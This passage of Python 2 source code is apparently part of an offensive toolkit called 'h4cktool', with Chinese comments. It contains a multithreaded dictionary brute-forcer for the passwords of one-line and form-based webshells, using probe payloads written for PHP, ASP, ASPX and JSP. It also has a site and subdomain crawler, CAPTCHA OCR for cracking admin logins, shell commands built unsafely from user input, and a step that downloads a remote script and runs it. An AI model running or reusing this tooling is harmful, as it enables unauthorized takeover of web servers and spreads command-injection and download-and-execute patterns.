    return_value={'user_form_name':'%s' % user_form_name,'pass_form_name':'%s' % pass_form_name}
    #print return_value
    return return_value


def get_form_from_uri(uri):
    #从uri的get请求中获取所有form表单
    #返回结果为一个字典,包含3个键值对
    #"user_form_name":"" 没有则相应返回值为None,不是返回""(空字符串)
    #"pass_form_name":"" 没有则相应返回值为None,不是返回""(空字符串)
    #"response_key_value":value 这个value的值是一个字典,也即get_response_key_value_from_uri函数的返回结果
    #之所以要每次在有访问uri结果的函数里面返回uri访问结果,这样是为了可以只访问一次uri,这样就可以一直将访问的返回结果传递下去,不用多访问,效率更高
    response_key_value=get_response_key_value_from_uri(uri)
    content=response_key_value['content']
    return_value=get_form_from_html(content)
    return_value['response_key_value']=response_key_value
    #print return_value
    return return_value

def crack_ext_direct_webshell_uri(uri,pass_dict_file,ext):
    #爆破php|asp|aspx|jsp的一句话类型的webshell
    #表单形式爆破的webshell爆破起来方法一样,不用分类,一句话形式的webshell爆破需要根据后缀对应的脚本的语法的不同来爆破
    def ext_direct_webshell_crack_thread((password,uri,ext)):
        if get_flag[0]==1:
            return
        if ext in ["php","asp","aspx"]:
            pattern=re.compile(r"29289",re.I)
        if ext=="jsp":
            pattern=re.compile(r"->\|.+\|<-",re.I)


        if ext=="php":
            #php的echo 29289后面必须加分号
            values={'%s' % password:'echo 29289;'}
        elif ext=="asp":
            #asp后面不能加分号
            values={'%s' % password:'response.write("29289")'}
        elif ext=="aspx":
            #aspx后面可加可不加分号
            values={'%s' % password:'Response.Write("29289");'}
        elif ext=="jsp":
            #jsp一句话比较特殊,似乎没有直接执行命令的post参数
            #A后面没有分号
            #jsp一句话中:
            #A参数是打印当前webshell所在路径,post A参数返回内容如下
            #->|路径|<-  (eg.->|/home/llll/upload/custom |<-)
            #B参数是列目录
            #C参数是读文件
            #D,E,F,....参考jsp菜刀一句话服务端代码
            values={'%s' % password:'A'}

        data = urllib.urlencode(values)
        try_time[0]+=1

        '''
        try:
            req = urllib2.Request(uri, data)
            response = urllib2.urlopen(req)
            html=response.read()
        #要直接爆破的webshell是404类型的webshell
        except urllib2.URLError,e:
            html=e.read()
            #print html
        '''
        #post_request可处理表单post和无表单post,以及code=404的状况
        html=post_request(uri,values)

        PASSWORD="("+password+")"+(52-len(password))*" "
        sys.stdout.write('-'*(try_time[0]/(sum[0]/100))+'>'+str(try_time[0]/(sum[0]/100))+'%'+' %s/%s %s\r' % (try_time[0],sum[0],PASSWORD))
        sys.stdout.flush()

        if re.search(pattern,html):
            get_flag[0]=1
            end=time.time()
            #print "\b"*30
            #sys.stdout.flush()
            print Fore.RED+"congratulations!!! webshell cracked succeed!!!"
            string="cracked webshell:%s password:%s" % (uri,password)
            print Fore.RED+string
            print "you spend time:"+str(end-start[0])
            http_domain_value=get_http_domain_from_uri(uri)
            #经验证terminate()应该只能结束当前线程,不能达到结束所有线程
            write_string_to_sql(string,"h4cktool","targets","scan_result","http_domain",http_domain_value)
    def crack_ext_direct_webshell_uri_inside_func(uri,pass_dict_file,ext):
        uris=[]
        exts=[]
        passwords=[]
        i=0
        while 1:
            if os.path.exists(pass_dict_file) is False:
                print "please input your password dict:>",
                pass_dict_file=raw_input()
                if os.path.exists(pass_dict_file) is True:
                    break
            else:
                break
        f=open(pass_dict_file,"r+")
        for each in f:
            uris.append(uri)
            exts.append(ext)
            each=re.sub(r"(\s)$","",each)
            passwords.append(each)
            i+=1
        f.close()
        sum[0]=i
        start[0]=time.time()

        #这里如果用的map将一直等到所有字典尝试完毕才退出,map是阻塞式,map_async是非阻塞式,用了map_async后要在成功爆破密码的线程中关闭线程池,不让其他将要运行的线程运行,这样就不会出现已经爆破成功还在阻塞的情况了,可参考下面文章
        #后来试验似乎上面这句话可能是错的,要参照notes中的相关说明
        #http://blog.rockyqi.net/python-threading-and-multiprocessing.html
        pool=ThreadPool(20)
        results_list=pool.map_async(ext_direct_webshell_crack_thread,zip(passwords,uris,exts))
        pool.close()
        pool.join()

    get_flag=[0]
    try_time=[0]
    sum=[0]
    start=[0]


    crack_ext_direct_webshell_uri_inside_func(uri,pass_dict_file,ext)
    return get_flag[0]








def crack_admin_login_uri(uri,user_dict_file,pass_dict_file):
    #爆破管理员后台登录uri,尝试自动识别验证码
    pass






def crack_allext_biaodan_webshell_uri(uri,user_dict_file,pass_dict_file):
    #爆破表单类型的webshell
    #表单类型的webshell爆破方法一样,不用分不同脚本类型分别爆破
    def allext_biaodan_webshell_crack_thread((password,uri)):
        if get_flag[0]==1:
            return
        pattern=re.compile(r".*((/home)|(c:)|(/phpstudy)|(/var)|(wamp)).*",re.I)
        values={'%s' % pass_form_name:'%s' % password}
        try_time[0]+=1
        html=post_request(uri,values)


        PASSWORD="("+password+")"+(52-len(password))*" "
        sys.stdout.write('-'*(try_time[0]/(sum[0]/100))+'>'+str(try_time[0]/(sum[0]/100))+'%'+' %s/%s %s\r' % (try_time[0],sum[0],PASSWORD))
        sys.stdout.flush()

        if re.search(pattern,html) or len(html)-unlogin_length>8000:
            get_flag[0]=1
            end=time.time()
            print Fore.RED+"congratulations!!! webshell cracked succeed!!!"
            string="cracked webshell:%s password:%s" % (uri,password)
            print Fore.RED+string
            print "you spend time:"+str(end-start[0])
            http_domain_value=get_http_domain_from_uri(uri)
            #经验证terminate()应该只能结束当前线程,不能达到结束所有线程
            write_string_to_sql(string,"h4cktool","targets","scan_result","http_domain",http_domain_value)
            return password
    def crack_allext_biaodan_webshell_uri_inside_func(uri,user_dict_file,pass_dict_file):
        uris=[]
        passwords=[]
        i=0
        while 1:
            if os.path.exists(pass_dict_file) is False:
                print "please input your password dict:>",
                pass_dict_file=raw_input()
                if os.path.exists(pass_dict_file) is True:
                    break
            else:
                break
        f=open(pass_dict_file,"r+")
        for each in f:
            uris.append(uri)
            each=re.sub(r"(\s)$","",each)
            passwords.append(each)
            i+=1
        f.close()
        sum[0]=i
        start[0]=time.time()

        #MAX_VALUE=sum[0]
        #bar=Bar(max_value=MAX_VALUE, fallback=True)
        #bar.cursor.clear_lines(1)#used to be 2
        #bar.cursor.save()


        #这里如果用的map将一直等到所有字典尝试完毕才退出,map是阻塞式,map_async是非阻塞式,用了map_async后要在成功爆破密码的线程中关闭线程池,不让其他将要运行的线程运行,这样就不会出现已经爆破成功还在阻塞的情况了,可参考下面文章
        #后来试验似乎上面这句话可能是错的,要参照notes中的相关说明
        #http://blog.rockyqi.net/python-threading-and-multiprocessing.html
        pool=ThreadPool(20)
        results_list=pool.map_async(allext_biaodan_webshell_crack_thread,zip(passwords,uris))
        pool.close()
        pool.join()

    user_dict_file="dicts/user.txt"
    pass_dict_file="dicts/webshell_passwords.txt"
    user_form_name=get_form_from_uri(uri)['user_form_name']
    pass_form_name=get_form_from_uri(uri)['pass_form_name']
    #这里如果字典中的返回键值对中的一个键对应的值为""(空字符串),那么返回的结果是"None"(一个叫做None的字符串)
    #print type(user_form_name)
    response_key_value=get_form_from_uri(uri)['response_key_value']
    unlogin_length=len(response_key_value['content'])

    get_flag=[0]
    try_time=[0]
    sum=[0]
    start=[0]
    current_password=[""]


    if user_form_name!="None":
        while 1:
            if os.path.exists(user_dict_file) is False:
                print "please input your username dict:>",
                user_dict=raw_input()
                if os.path.exists(user_dict_file) is True:
                    break
            else:
                break

        username_list=[]
        f=open(user_dict_file,"r+")
        for each in f:
            each=re.sub(r"(\s)$","",each)
            username_list.append(each)
        f.close()

        crack_admin_login_uri(uri,user_dict_file,pass_dict_file)

    else:
        crack_allext_biaodan_webshell_uri_inside_func(uri,user_dict_file,pass_dict_file)

    return get_flag[0]


def crack_webshell(uri,anyway=0):
    #webshll爆破,第二个参数默认为0,如果设置不为0,则不考虑判断是否是webshll,如果设置为1,直接按direct_bao方式爆破,如果设置为2,直接按biaodan_bao方式爆破
    figlet2file("cracking webshell","/tmp/figletpic",True)
    print "cracking webshell --> %s" % uri
    print "正在使用吃奶的劲爆破..."


    ext=get_webshell_suffix_type(uri)
    tmp=check_webshell_uri(uri)

    if anyway==1 or tmp['y2']=="direct_bao":
        return_value=crack_ext_direct_webshell_uri(uri,"dicts/webshell_passwords.txt",ext)
        if return_value==0:
            print "webshell爆破失败 :("
            return
    if anyway==2 or tmp['y2']=="biaodan_bao":
        return_value=crack_allext_biaodan_webshell_uri(uri,"dicts/user.txt","dicts/webshell_passwords.txt")
        if return_value==0:
            print "webshell爆破失败 :("
            return
    if tmp['y2']=="bypass":
        print Fore.RED+"congratulations!!! webshell may found and has no password!!!"
        string="cracked webshell:%s no password!!!" % uri
        print Fore.RED+string
        write_string_to_sql(string,"h4cktool","targets","scan_result","http_domain",http_domain_value)
        return

    else:
        print "这不是一个webshell :("
        return


def database_init():
    #本地数据库初始化,完成数据库配置
    if os.path.exists("config.txt"):
        f=open("config.txt","r")
        all=f.readlines()
        f.close()
        config_file_abs_path=os.getcwd()+"/config.txt"
        find_db_server=get_key_value_from_file("db_server",'',config_file_abs_path)
        if find_db_server:
            db_server=find_db_server
            print "db_server:"+db_server
        else:
            print "can not find db_server"
            print "please input your dbtabase server addr:>",
            db_server=raw_input()
            os.system("echo db_server=%s >> %s" % (db_server,config_file_abs_path))
            print "db_server:"+db_server
        find_db_user=get_key_value_from_file("db_user",'',config_file_abs_path)
        if find_db_user:
            db_user=find_db_user
            print "db_user:"+db_user
        else:
            print "can not find db_user"
            print "please input your database username:>",
            db_user=raw_input()
            os.system("echo db_user=%s >> %s" % (db_user,config_file_abs_path))
            print "db_user:"+db_user
        find_db_pass=get_key_value_from_file("db_pass",'',config_file_abs_path)
        if find_db_pass:
            db_pass=find_db_pass
            print "db_pass:"+db_pass
        else:
            print "can not find db_pass"
            print "please input your database password:>",
            db_pass=raw_input()
            os.system("echo db_pass=%s >> %s" % (db_pass,config_file_abs_path))
            print "db_pass:"+db_pass
    else:
        try:
            os.system("touch config.txt")
            while 1:
                print "please input your database server addr:>",
                db_server=raw_input()
                if check_string_is_ip(db_server) is True:
                    os.system("echo db_server=%s >> config.txt" % db_server)
                    break
                else:
                    print "your input may not be a regular ip addr:("
                    continue
            print "please input your database username:>",
            db_user=raw_input()
            os.system("echo db_user=%s >> config.txt" % db_user)
            print "please input your database password:>",
            db_pass=raw_input()
            os.system("echo db_pass=%s >> config.txt" % db_pass)
        except:
            print "create database config file error"




def collect_uris_from_uri(uri):
#从uri所在的html内容中收集uri到uri队列
#返回值是一个字典,{'y1':y1,'y2':y2}
#y1是根据参数uri得到的html页面中的所有uri,是个列表类型
#y2是参数uri对应的三个关键元素,y2是个字典类型,eg.{"code":200,"title":None,"content":""}
    all_uris=[]
    result=get_request(uri)
    content=result['content']
    bs=BeautifulSoup(content,"lxml")
    for each in bs.find_all('a'):
        find_uri=each.get('href')
        all_uris.append(find_uri)
    return {'y1':all_uris,'y2':result}


class MyThread(threading.Thread):
    def __init__(self,func,args,name=''):
        threading.Thread.__init__(self)
        self.name=name
        self.func=func
        self.args=args
    def run(self):
        self.result=apply(self.func,self.args)
    def get_result():
        return self.result

def crawl_uri(uri):
    #爬虫,可获取uri对应网站的所有可抓取的uri和所有网页三元素:code,title,content
    uris_queue=Queue.Queue()
    uris_uri_keyvalues={}
    #uri和uri的三个元素的对应值为一个字典的键值对
    #eg{'http://www.baiud.com':{'code':code,'title':title,'content':content},"":{},"":{},...}
    #用于收集uri与对应的三个元素的值,收集后考虑可能统一存入数据库

    #收集相同域名网站内的uris
    domain_uris=[]
    #收集二级域名
    subdomain_uris=[]
    def task_finish_func():
        while True:
            current_uri=uris_queue.get()
            http_domain=get_http_domain_from_uri(current_uri)
            #eg.main_domain_prefix从http://www.freebuf.com中得到www
            #main_domain_key_value从http://www.freebuf.com中得到freebuf
            main_domain_prefix=re.search(r"http(s)?://([^\.]*)\.([^\./]*)",current_uri).group(2)
            main_domain_key_value=re.search(r"http(s)?://([^\.]*)\.([^\./]*)",current_uri).group(3)
            #print main_domain_prefix
            #print main_domain_key_value
            #raw_input()
            result=collect_uris_from_uri(current_uri)
            uris=result['y1']
            for each in uris:
                #collect_uris_from_uri得到的结果中的元素可能是None
                if each is not None:
                    tmp=get_http_domain_pattern_from_uri(http_domain)
                    http_domain_pattern=re.compile(r"%s" % tmp)
                    if re.match(http_domain_pattern,each):
                        each=re.sub(r"/$","",each)
                        if each not in domain_uris:
                            print each
                            domain_uris.append(each)
                            #print domain_uris
                            uris_queue.put(each)
                    if re.match(r"http(s)?://[^\.]*(?<!%s)\.%s" % (main_domain_prefix,main_domain_key_value),each):
                        each_subdomain=get_http_domain_from_uri(each)
                        if each_subdomain not in subdomain_uris:
                            #二级域名只将http_domain部分加入收藏,不放到队列里
                            print each_subdomain
                            subdomain_uris.append(each_subdomain)
            uris_uri_keyvalues['%s' % uri]=result
            uris_queue.task_done()


    #初始化
    uri=re.sub(r"(/{0,2}(\s){0,2})$","",uri)
    start_uris=[uri]
    http_domain=get_http_domain_from_uri(uri)
    if uri!=http_domain:
        start_uris.append(http_domain)
    for each in start_uris:
        uris_queue.put(each)

    '''传统多线程
    mythreads=[]
    start=time.time()
    for i in range(15):
        mythread=MyThread(task_finish_func,())
        mythreads.append(mythread)
    for i in range(15):
        mythreads[i].setDaemon(True)
        mythreads[i].start()
        print "%s threads started" % str(i)
    uris_queue.join()
    end=time.time()
    print end-start
    print len(domain_uris)
    #upon threads=200 ===> 38,16
    #threads=5 ===> 12,16
    #threads=10 4,16
    #threads=15 3.4,16
    '''

    '''单线程
    start=time.time()
    task_finish_func()
    uris_queue.join()
    end=time.time()
    print end-start
    print len(domain_uris)
    #thread=1 task_finish_func中while True改成while uris_queue.empty() is False,要不然不会执行到最后     19.4,16
    '''

    mythreads=[]
    start=time.time()
    pool=ThreadPool(15)
    for i in range(15):
        #这里比较特殊,因为函数task_finish_func是个无限循环的函数,所以就算这里开20个线程也会因为线程池中只有15个位置使得一直只有15个线程在运行，多余的5个线程相当于没有设置一样
        pool.apply_async(task_finish_func,())
    pool.close()

    while 1:
        #这里的if取代下面的uris_queue.join(),有时爬虫被ban时,如果用uris_queue.join()会无限等待
        num_of_result=len(domain_uris)
        #实验中15s是较好的数据
        sleep(15)
        if len(domain_uris)==num_of_result:
            print "finished,if the number of uris you get is not big enough,you may be banned to crawl :("
            break

    #uris_queue.join()
    end=time.time()
    print end-start
    print len(domain_uris)
    #threads=15(pool_size=15,for_range=20) 4.15,16
    #threads=20(pool_size=20,for_range=20) 9.2,16
    #threads=10(pool_size=10,for_range=20) 4.2,16


def get_yanzhengma_from_pic(img, cleanup=True, plus=''):
    # 调用系统安装的tesseract来识别验证码
    # cleanup为True则识别完成后删除生成的文本文件
    # plus参数为给tesseract的附加高级参数
    #print get_string_from_yanzhengma('2.jpg')  # 打印识别出的文本，删除txt文件
    #print get_string_from_yanzhengma('2.jpg', False)  # 打印识别出的文本，不删除txt文件
    #print get_string_from_yanzhengma('2.jpg', False, '-l eng')  # 打印识别出的文本，不删除txt文件，同时提供高级参数
    try:
        os.system('tesseract ' + img + ' ' + img + ' ' + plus)  # 生成同名txt文件
    except:
        os.system("wget https://raw.githubusercontent.com/3xp10it/mytools/master/install_tesseract.sh")
        os.system("chmod +x install_tesseract.sh")
        os.system("./install_tesseract.sh")
        os.system('tesseract ' + img + ' ' + img + ' ' + plus)  # 生成同名txt文件

    text = file(img + '.txt').read().strip()
    if cleanup:
        os.remove(img + '.txt')
    return text
